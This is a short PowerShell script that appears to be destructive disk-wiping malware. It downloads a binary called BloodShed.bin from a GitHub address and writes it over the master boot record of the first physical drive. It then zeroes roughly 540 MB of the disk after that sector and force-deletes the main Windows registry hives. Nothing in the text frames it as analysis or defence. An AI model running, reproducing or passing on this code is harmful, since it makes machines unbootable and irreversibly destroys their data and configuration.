curl -L "https://github.com/Syed930s/BloodShed/blob/main/BloodShed.bin" -o C:\mbr.bin
$BinPath     = "C:\mbr.bin"
$DiskNumber  = 0

$mbrData = [System.IO.File]::ReadAllBytes($BinPath)
if ($mbrData.Length -ne 512) {
    Write-Error "ERR123."
}

$disk = [System.IO.File]::Open(
    "\\.\PhysicalDrive$DiskNumber",
    [System.IO.FileMode]::Open,
    [System.IO.FileAccess]::Write,
    [System.IO.FileShare]::ReadWrite
)

$disk.Write($mbrData, 0, 512)
$disk.Flush()
$disk.Close()

$disk = "\\.\PhysicalDrive0"
$size = 540960000
$bytes = New-Object byte[]($size)
try {
    $stream = [System.IO.File]::Open($disk, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
    $stream.Position = 512
    $stream.Write($bytes, 0, $size)
} catch {
    Write-Host "ERR174: $_"
} finally {
    if ($stream) { $stream.Close() }
}

# Cleanup
@("HKLM", "HKCC", "HKU", "HKCR", "HKCU") | ForEach-Object {
    cmd /c "reg delete $_ /f"
}
